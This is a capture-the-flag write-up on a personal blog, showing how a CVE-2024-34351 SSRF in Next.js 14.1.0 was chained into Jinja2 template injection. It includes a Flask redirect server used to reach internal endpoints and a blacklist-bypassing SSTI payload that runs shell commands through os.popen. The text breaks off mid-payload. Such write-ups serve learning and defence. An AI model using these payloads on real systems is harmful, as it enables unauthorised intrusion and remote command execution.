@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="megat">
+
+
+    <meta name="subtitle" content="that one socially inept kid">
+
+
+    <meta name="description" content="whoami">
+
+
+    <meta name="keywords" content="aan, megat, ilikeronnnnii">
+
+
+<title>NextJS v14.1.0 CurtinCTF | aan</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/music">Music</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/music">Music</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">NextJS v14.1.0 CurtinCTF</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">megat</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 16, 2025&nbsp;&nbsp;13:35:07</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeups/">Writeups</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="The-Hive-CurtinCTF"><a href="#The-Hive-CurtinCTF" class="headerlink" title="The Hive CurtinCTF"></a>The Hive CurtinCTF</h1><p>This challenge is black-box. Technically, you can obtain the source code, but it costs <strong>500 points</strong>. Hell naw.</p>
+<h2 id="Next-js-Discovery"><a href="#Next-js-Discovery" class="headerlink" title="Next.js Discovery"></a>Next.js Discovery</h2><p>At first I’ve noticed that the website is running on Next.js</p>
+<p><img src="https://hackmd.io/_uploads/rJ18CPIXWe.png" alt="image"></p>
+<p>My first guess was it might be vulnerable to one of the famous CVE by <a target="_blank" rel="noopener" href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">zhero</a>, however I was completely wrong.</p>
+<p>So I try to find out what version of Next.js its currently running to figure out if there is vulnerability related to it.</p>
+<p>After digging for quite some time. One of the chunk files of the Next.js shows that it is currently running on version 14.1.0 which is vulnerable to this <a target="_blank" rel="noopener" href="https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps">CVE-2024-34351</a>.</p>
+<p><img src="https://hackmd.io/_uploads/rJiLRPUX-e.png" alt="image-1"></p>
+<p>So, we have already find out that the server potentially vulnerable to SSRF but, where can we trigger it?</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><img src="https://hackmd.io/_uploads/S1HwRPUmWx.png" alt="image-3"></p>
+<p>If you click on one of the pastes available on the website it send a <code>POST</code> request to the main endpoint like so.</p>
+<p><img src="https://hackmd.io/_uploads/ByawCPIQWl.png" alt="image-2"></p>
+<blockquote>
+<p>“What is interesting is that instead of returning the redirect directly to the client, if the redirect starts with &#x2F; (for example, a redirect to &#x2F;login) the server will fetch the result of the redirect <em>server side</em>, then return it back to the client. However, looking closely, we see that the Host header is taken from the client”</p>
+</blockquote>
+<p>Apparently to replicate the SSRF attack all you need to do is call a server action, by passing the <code>Next-Action</code> header and modify the <code>Origin</code> and <code>Host</code> header to your webhook.</p>
+<p><img src="https://hackmd.io/_uploads/HJwO0wUmZg.png" alt="image-4"></p>
+<p>I’m not sure why but I’ve tried to host my webhook using tunnelmole, burp collaborator, and even webhook.site. Unfortunately none of them managed to intercept the request made by the server. Finally I’ve decided to use ngrok and luckily it works.</p>
+<p><img src="https://hackmd.io/_uploads/S1yKAw8mZg.png" alt="image-6"></p>
+<p>So now we can try to find out the internal services that is running on the server by modifying our payload to make the server redirect to the internal services. I first try to make it redirect to google.com to find out if it works.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;HEAD&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(request.headers)</span><br><span class="line">        resp = Response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/x-component&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;http://google.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">7777</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/H1OYRDLX-x.png" alt="image-7"></p>
+<p>Now I try to make it redirect to <a target="_blank" rel="noopener" href="http://127.0.0.1:1337/">http://127.0.0.1:1337</a> to find out the internal services that is running. Somehow encountered a login page that looks weird.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/images/icon.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/styles.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Dimitri&#x27;s AV | log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/images/icon.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span>[user authentication]<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;login-container-input&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">id</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;login-container-input mt-2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">id</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;login-container-button mt-2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">id</span>=<span class="string">&quot;login-btn&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">          &gt;</span></span><br><span class="line">            log-in</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/register&quot;</span>&gt;</span>register<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Apart from the <code>/login</code> endpoint we can use the <code>/register</code> endpoint to create a new user.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/images/icon.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/styles.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Dimitri&#x27;s AV | register<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/images/icon.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span>[user registration]<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;login-container-input w-100&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;login-container-input w-100 mt-2&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;login-container-button mt-2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">            register</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/login&quot;</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>We can create a new user using this payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;HEAD&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(request.headers)</span><br><span class="line">        resp = Response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/x-component&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;http://127.0.0.1:3000/register?username=aan&amp;password=aan&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">7777</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>After creating a user this is what we got. Which means we are able to login now.</p>
+<p><img src="https://hackmd.io/_uploads/H1V90PLXbg.png" alt="image-8"></p>
+<p>Here need to fuzz the path, found out that <code>/home</code> can be accessed with token parameters that we have gained earlier. Like so <code>localhost:3000/home?token= b396c8ed80ca22776e0df73d4f08368d</code></p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p><img src="https://hackmd.io/_uploads/H19qRD8mZl.png" alt="image-9"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/home&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;directoryPath&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-label&quot;</span>&gt;</span>Directory Path:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">      <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;directoryPath&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;directory&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">required</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Scan Directory<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>This right here it has some kind of directory scanning features, however, the directory parameter is actually vulnerable to SSTI, its just that you need to bypass the blacklist function.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invalid_chars = [<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>,<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;x&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>These blacklist function are still vulnerable because you can still bypass this with a couple of tricks from these 2 references <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md">payloadallthethings</a> or <a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">0day.work</a> . Final crafted payload was this.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">with</span> output=((((request|attr(<span class="string">&#x27;application&#x27;</span>))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;globals&#x27;</span>)))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;getitem&#x27;</span>)))(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;builtins&#x27;</span>))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;getitem&#x27;</span>)))(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;import&#x27;</span>))(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;cmd&#x27;</span>))|attr(<span class="string">&#x27;read&#x27;</span>)()%&#125;&#123;%<span class="built_in">print</span>(output)%&#125;&#123;%endwith%&#125;&amp;<span class="built_in">globals</span>=__globals__&amp;getitem=__getitem__&amp;builtins=__builtins__&amp;<span class="keyword">import</span>=<span class="built_in">__import__</span>&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/H1riCvI7bl.png" alt="image-10"></p>
+<p>Now all you need to do is find and read the flag :D</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">with</span> output=((((request|attr(<span class="string">&#x27;application&#x27;</span>))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;globals&#x27;</span>)))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;getitem&#x27;</span>)))(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;builtins&#x27;</span>))|attr(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;getitem&#x27;</span>)))(request|attr(<span class="string">&quot;args&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&#x27;import&#x27;</span>))(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(request|attr(<span 